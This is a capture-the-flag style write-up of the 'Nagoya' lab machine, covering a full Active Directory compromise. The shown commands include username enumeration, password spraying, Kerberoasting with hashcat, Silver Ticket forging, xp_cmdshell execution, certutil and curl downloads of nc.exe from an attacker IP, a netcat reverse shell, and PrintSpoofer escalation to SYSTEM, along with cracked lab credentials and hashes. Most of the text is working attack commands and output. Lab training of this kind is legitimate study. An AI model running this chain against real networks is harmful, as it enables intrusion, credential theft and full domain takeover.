#box #kerbrute #OSINT #password-spraying #ILSpy #net-rpc #chisel #impacket-ticketer #hashcat #impacket-mssqlclient #xp_cmdshell #certutil #PrintSpoofer 
## Nmap

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-11 11:25 EDT
Nmap scan report for 192.168.161.21
Host is up (0.039s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
80/tcp   open  http              Microsoft IIS httpd 10.0
|_http-title: Nagoya Industries - Nagoya
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-07-11 15:26:05Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
|_ssl-date: 2025-07-11T15:26:57+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=nagoya.nagoya-industries.com
| Not valid before: 2025-07-10T15:13:59
|_Not valid after:  2026-01-09T15:13:59
| rdp-ntlm-info: 
|   Target_Name: NAGOYA-IND
|   NetBIOS_Domain_Name: NAGOYA-IND
|   NetBIOS_Computer_Name: NAGOYA
|   DNS_Domain_Name: nagoya-industries.com
|   DNS_Computer_Name: nagoya.nagoya-industries.com
|   DNS_Tree_Name: nagoya-industries.com
|   Product_Version: 10.0.17763
|_  System_Time: 2025-07-11T15:26:18+00:00
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: NAGOYA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-11T15:26:18
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.51 seconds
```

## 80 - HTTP

On port 80 we discover a website hosting some information relative to Nagoya Industries. 
By looking at the bottom we discover it was made in **2023**.
By clicking on the page **Team** we discover a list of users, so we decide to extract this list and put it in a txt file with the rule ` {name}.{surname}}` .

```text
Matthew.Harrison
Emma.Miah
Rebecca.Bell
Scott.Gardner
Terry.Edwards
Holly.Matthews
Anne.Jenkins
Brett.Naylor
Melissa.Mitchell
Craig.Carr
Fiona.Clark
Patrick.Martin
Kate.Watson
Kirsty.Norris
Andrea.Hayes
Abigail.Hughes
Melanie.Watson
Frances.Ward
Sylvia.King
Wayne.Hartley
Iain.White
Joanna.Wood
Bethan.Webster
Elaine.Brady
Christopher.Lewis
Megan.Johnson
Damien.Chapman
Joanne.Lewis
```

To test whether those names exists and the format is valid, we use `kerbrute`.

```bash
┌──(root㉿kali)-[~/Desktop/OSCP/Nagoya]
└─# ./kerbrute userenum -d nagoya-industries.com  users.txt -t 100 --dc 192.168.118.21

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/12/25 - Ronnie Flathers @ropnop

2025/07/12 04:47:11 >  Using KDC(s):
2025/07/12 04:47:11 >   192.168.118.21:88

2025/07/12 04:47:11 >  [+] VALID USERNAME:       Emma.Miah@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Terry.Edwards@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Matthew.Harrison@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Rebecca.Bell@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Melissa.Mitchell@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Scott.Gardner@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Brett.Naylor@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Anne.Jenkins@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Craig.Carr@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Andrea.Hayes@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Kate.Watson@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Fiona.Clark@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Kirsty.Norris@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Wayne.Hartley@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Patrick.Martin@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Christopher.Lewis@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Abigail.Hughes@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Joanne.Lewis@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Frances.Ward@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Sylvia.King@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Iain.White@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Melanie.Watson@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Elaine.Brady@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Damien.Chapman@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Joanna.Wood@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Bethan.Webster@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Megan.Johnson@nagoya-industries.com
2025/07/12 04:47:11 >  [+] VALID USERNAME:       Holly.Matthews@nagoya-industries.com
2025/07/12 04:47:11 >  Done! Tested 28 usernames (28 valid) in 0.037 seconds
```

### Figuring out the password

To figure out the password, the tip by OSCP was to use references related to the webapp and using seasons + year apparently. While it seemed quite a forced guess to me, we opt to perform password spraying on the list of user trying different combinations and most importantly `--continue-on-success` flag from netexec in case more than one user had the same password:

```bash
nxc -t 500 smb 192.168.118.21 -u users.txt -p 'Nagoya2023' --continue-on-success

SMB         192.168.118.21  445    NAGOYA           [+] nagoya-industries.com\Andrea.Hayes:Nagoya2023

nxc -t 500 smb 192.168.118.21 -u users.txt -p 'Spring2023'

SMB         192.168.118.21  445    NAGOYA           [+] nagoya-industries.com\Craig.Carr:Spring2023

nxc -t 500 smb 192.168.118.21 -u users.txt -p 'Summer2023' --continue-on-success

SMB         192.168.118.21  445    NAGOYA           [+] nagoya-industries.com\Fiona.Clark:Summer2023
```

Finally, we have the following footholds:

`Andrea.Hayes:Nagoya2023`
`Craig.Carr:Spring2023`
`Fiona.Clark:Summer2023`

Other combination didn't seem to return anything.

## 445 - SMB

We discover that `Andrea.Hayes` has access to SMB and by accessing NETLOGON's share we discover the presence of a suspicious EXE, `ResetPassword.exe`.
We opt to Decompile it with [AvaloniaILSpy](https://github.com/icsharpcode/AvaloniaILSpy/releases/tag/v7.2-rc) a Linux version of the ILSpy decompiler by simply downloading it, unzipping it and then by `./ILSpy ResetPassword.exe` from the folder of the binary of ILSpy (/artifacts/linux-x64)

Inside the compiler, we find a new pair of credentials `svc_helpdesk:U299iYRmikYTHDbPbxPoYYfa2j4x4cdg`

![[attachments/nagoya-writeup-1.png]]

## Bloodhound

By gaining access to `svc_helpdesk` we finally can gain a foothold with bloodhound-python.
This will grant us the access to the AD map with bloodhound, with which we can escalate further privileges in the AD.
## Targeting high value targets

Within access to bloodhound, we realize that `svc_helpdesk` is a member of `helpdesk@nagoya-industries.com` which have a GenericAll right over some of the users of the AD. By checking all of them, we realize one in particular, `Christopher.Lewis` has some interesting bounds with other groups, particularly `remote`

We opt to use `net rpc` from Samba to change its password, gaining control of that user:
```bash
net rpc password "CHRISTOPHER.LEWIS" "Nagoya2023" -U "nagoya-industries.com"/"svc_helpdesk"%"U299iYRmikYTHDbPbxPoYYfa2j4x4cdg" -S "192.168.118.21"
```

## 5985 - WinRM

Within `Christopher.Lewis`, we're now able to finally connect through WinRM getting the local flag.

Once on the local machine, we discover the presence of a SQL Server instance and a `svc_mssql` user seems to exist on the target machine.
We noticed, through bloodhound, that the `svc_mssql` appears to be kerberoastable, so we opt for [[Kerberoast#^targetedKerberoast|targetedKerberoast]] it.

More users than `svc_mssql` are kerberoasted, but our focus remains on the sql server user. We save the tgs hash in a file and we then crack it with hashcat - rockyou:

```bash
hashcat -m 13100 kerberoasted.txt /usr/share/wordlists/rockyou.txt
```

Obtaining the following credentials: `svc_mssql:Service1`

## Crafting a Silver Ticket with impacket-ticketer

Creating a Silver Ticket is possible when having access to a Service account. However, creating a Silver Ticket has different requirements, listed below:
* The Domain SID, obtainable with `Get-ADDomain`
* The NTHASH of the password of the service user, this is used to encrypt the PAC used to craft the TGS. This tool can be used: https://www.browserling.com/tools/ntlm-hash
* The SPN of the service user: `Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames`
* The domain name: `nagoya-industries.com`

We obtain first the Domain SID with `Get-ADDomain`: 
`S-1-5-21-1969309164-1513403977-1686805993`

Then the NTHASH, converted from our `Service1` password: 
`E3A0168BC21CFB88B95C954A5B18F57C`

Then we get the SPN of the user `svc_mssql` with the command `Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames`: \
`{MSSQL/nagoya.nagoya-industries.com}`

We then combine those values to properly craft a Silver Ticket on our linux machine with impacket-ticketer:

```bash
impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid "S-1-5-21-1969309164-1513403977-1686805993" -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com Administrator
```

Obtaining a `.ccache` file. We then export this ccache file as an env variable named `KRB5CCNAME`:
```bash
export KRB5CCNAME=/root/Desktop/OSCP/Nagoya/administrator.ccache
```
This ticket will now permit us to authenticate to mssql as the user svc_mssql within `impacket-mssqlclient`.

#### Tunneling requests with Chisel

To be able to properly connect from our attacking machine to the target sql machine (considering that the sql machine is not accessible from outside) we must tunnel the requests from the target machine to our attacking machine. To create the tunnel we'll download Chisel and set it up [accordingly](obsidian://open?vault=Pentesting&file=Pivoting%2C%20Tunneling%20and%20Port%20Forwarding%2FSOCKS5%20Tunneling%20with%20Chisel).
In this specific case, we'll set up the client on the pivot and the server on our target machine, so we'll receive the traffic from the pivot.

```bash
# Attacker Machine:
./chisel server -v -p 1234 --reverse

# Pivot:
./chisel.exe client -v 192.168.45.166:1234 R:1433:127.0.0.1:1433 # We're mapping port 1433 on the pivot to be redirected on port 1433 on our attacking machine

# Pivot simplified, by mapping only port 1433 to be redirected:
./chisel.exe client -v 192.168.45.166:1234 R:1433
```

---

At this point, given we have:
* A tunnel set up with the Pivot
* The Silver Ticket crafted above which returned us the `ccache` file and that we have export the env variable named as `KRB5CCNAME`
We're now able to connect to the sql server, externally from our machine since we tunneled with Chisel all the traffic on port 1433, as `svc_mssql` since we crafted the Silver Ticket.
Precisely, we'll connect with `impacket-mssqlclient`:
```bash
impacket-mssqlclient -k nagoya.nagoya-industries.com
```

## Gaining Foothold 2 with `svc_mssql`

Once authenticated on the sql server, we can use `help` from impacket-mssqlclient to properly understand which type of commands we can use.

```bash
SQL (NAGOYA-IND\Administrator  dbo@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
    show_query                 - show query
    mask_query                 - mask query
```

We opt for enabling `xp_cmdshell` and then test it out with a simple command to understand whether it worked or not, succeeding in achieving RCE from MSSQL throughout `xp_cmdshell`.

```bash
SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell whoami
ERROR(nagoya\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.                      
SQL (NAGOYA-IND\Administrator  dbo@master)> enable_xp_cmdshell
INFO(nagoya\SQLEXPRESS): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.                                                                                                                                        
INFO(nagoya\SQLEXPRESS): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.       
SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell whoami                                                                             
output                                                                                                                                     
--------------------                                                                                                                       
nagoya-ind\svc_mssql                                                                                                                       
```

At this point, we can try to understand which type of privileges this user has, also to understand whether it's worth or not to achieve a shell on that user, thus we use `whoami /priv` to know more:

```bash
SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell whoami /priv                                                                       
output                                                                                                                                     
--------------------------------------------------------------------------------                                                           
NULL                                                                                                                                       
                                                                                                                                           
PRIVILEGES INFORMATION                                                                                                                     
                                                                                                                                           
----------------------                                                                                                                     
                                                                                                                                           
NULL                                                                               

Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeMachineAccountPrivilege     Add workstations to domain                Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
```

This provides plenty of interesting information, this use has `SeImpersonatePrivilege` enabled, thus it might be vulnerable to [JuicyPotato](https://github.com/ohpe/juicy-potato) or [PrintSpoofer](https://github.com/itm4n/PrintSpoofer). We could eventually understand that by knowing the version this machine is running, so we opt for checking `systeminfo` as well:
```bash
SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell systeminfo
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               

Host Name:                 NAGOYA                                                  
OS Name:                   Microsoft Windows Server 2019 Standard Evaluation       
OS Version:                10.0.17763 N/A Build 17763                              
OS Manufacturer:           Microsoft Corporation                                   
OS Configuration:          Primary Domain Controller                               
OS Build Type:             Multiprocessor Free                                     
Registered Owner:          Windows User                                            
Registered Organization:                                                           
Product ID:                00431-10000-00000-AA367                                 
Original Install Date:     4/29/2023, 11:09:05 AM                                  
System Boot Time:          8/1/2024, 6:57:29 PM                                    
System Manufacturer:       VMware, Inc.                                            
System Model:              VMware7,1                                               
System Type:               x64-based PC                                            
Processor(s):              1 Processor(s) Installed.                               
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2650 Mhz   
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023   
Windows Directory:         C:\Windows                                              
System Directory:          C:\Windows\system32                                     
Boot Device:               \Device\HarddiskVolume2                                 
System Locale:             en-us;English (United States)                           
Input Locale:              en-us;English (United States)                           
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)                  
Total Physical Memory:     2,047 MB                                                
Available Physical Memory: 660 MB                                                  
Virtual Memory: Max Size:  3,199 MB                                                
Virtual Memory: Available: 1,857 MB                                                
Virtual Memory: In Use:    1,342 MB                                                
Page File Location(s):     C:\pagefile.sys                                         
Domain:                    nagoya-industries.com                                   
Logon Server:              N/A                                                     
Hotfix(s):                 6 Hotfix(s) Installed.                                  
                           [01]: KB5022511                                         
                           [02]: KB4512577                                         
                           [03]: KB4589208                                         
                           [04]: KB5012170                                         
                           [05]: KB5025229                                         
                           [06]: KB5023789                                         
Network Card(s):           1 NIC(s) Installed.                                     
                           [01]: vmxnet3 Ethernet Adapter                          
                                 Connection Name: Ethernet0                        
                                 DHCP Enabled:    No                               
                                 IP address(es)                                    
                                 [01]: 192.168.127.21                              
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

Considering the machine is running Windows Server 2019, we can opt for [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

### Achieving a Reverse Shell

To achieve a reverse shell, assuming we're basically running commands as if we were on the windows shell, we can use netcat. To do so, we can first upload netcat through `curl` or `certutil`

```bash
# Certutil
xp_cmdshell certutil -urlcache -f http://192.168.45.166:8000/nc.exe C:\Temp\nc.exe

# cURL
xp_cmdshell curl http://192.168.45.166:8000/nc.exe -o C:\Temp\nc.exe
```

Now we can then execute our reverse shell accordingly:

```bash
# Listener
nc -lvnp 443

# Sender
xp_cmdshell C:\Temp\nc.exe 192.168.45.166 443 -e cmd
```

Obtaining it:
```bash
C:\Windows\system32>whoami
whoami
nagoya-ind\svc_mssql
```

## Privilege Escalation

We can now download [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) on our machine and transfer it on the target machine:

```bash
certutil -urlcache -f http://192.168.45.166:8000/PrintSpoofer64.exe C:\Temp\PrintSpoofer64.exe
```

And execute it normally to gain a SYSTEM shell:

```bash
C:\Temp>.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.4252]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nagoya-ind\nagoya$
```
